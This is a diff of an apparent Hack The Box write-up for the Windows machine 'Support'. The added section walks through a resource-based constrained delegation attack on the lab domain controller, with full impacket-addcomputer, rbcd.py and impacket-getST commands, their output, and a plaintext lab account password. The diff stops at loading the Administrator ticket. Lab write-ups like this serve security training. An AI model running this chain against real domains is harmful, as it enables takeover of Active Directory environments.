@@ -1,4 +1,4 @@
-# Box: Support
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ca1b8279-a916-45d8-8b14-d50ef151babb)# Box: Support
 # Level: Easy
 # OS: Windows
 <hr>
@@ -365,13 +365,58 @@ Since we are the support user, we are inside the ```SHARED SUPPORT ACCOUNT@suppo
 
 Now from bloodhound we know that we got ```GenericAll``` permission to the ```dc.support.htb``` Domain Controller which means we have full rights to the ```dc.support.htb``` object.
 
+You can check out this [blog](https://hakin9.org/rbcd-attack-kerberos-resource-based-constrained-delegation-attack-from-outside-using-impacket/) to check out the steps for a remote resource based constrained delegation attack
 
+First, we add a new machine to the domain using impacket addcomputer script
 
+command:```impacket-addcomputer -computer-name 'evilcom$' -computer-pass password -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful```
 
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
+└─$ impacket-addcomputer -computer-name 'blackanon$' -computer-pass password -dc-ip 10.129.158.5 support/support:Ironside47pleasure40Watchful
+Impacket v0.11.0 - Copyright 2023 Fortra
 
+[!] No DC host set and 'support' doesn't look like a FQDN. DNS resolution of short names will probably fail.
+[*] Successfully added machine account blackanon$ with password password.
+```
+nice nice, the next thing we'll do is use the ```rbcd.py``` [script](https://github.com/tothi/rbcd-attack/blob/master/rbcd.py) to add the related security description of the newly created computer to the msDS-AllowedToActOnBehalfOfOtherIdentity property of the target computer, DC.
 
+command:```python rbcd.py -f BLACKANON -t DC -dc-ip 10.129.158.5 support\\support:Ironside47pleasure40Watchful``` 
 
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
+└─$ python rbcd.py -f BLACKANON -t DC -dc-ip 10.129.158.5 support\\support:Ironside47pleasure40Watchful
+Impacket v0.11.0 - Copyright 2023 Fortra
 
+[*] Starting Resource Based Constrained Delegation Attack against DC$
+[*] Initializing LDAP connection to 10.129.158.5
+[*] Using support\support account with password ***
+[*] LDAP bind OK
+[*] Initializing domainDumper()
+[*] Initializing LDAPAttack()
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `BLACKANON` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `DC`
+[*] Delegation rights modified succesfully!
+[*] BLACKANON$ can now impersonate users on DC$ via S4U2Proxy
+```
+Finally, we can get an impersonated Service Ticket for the target with Impacket’s getST.py script.
+
+command:```impacket-getST -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.129.158.5 support/BLACKANON$:password```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
+└─$ impacket-getST -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.129.158.5 support/BLACKANON$:password
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+We'll update the ```KRB5CCNAME``` environment variable with the path to the Administrator.ccache file, and then run the ```klist``` command to verify that the Service Ticket is loaded.
+
+command:```export KRB5CCNAME=`pwd`/Administrator.ccache;```
 
 
 
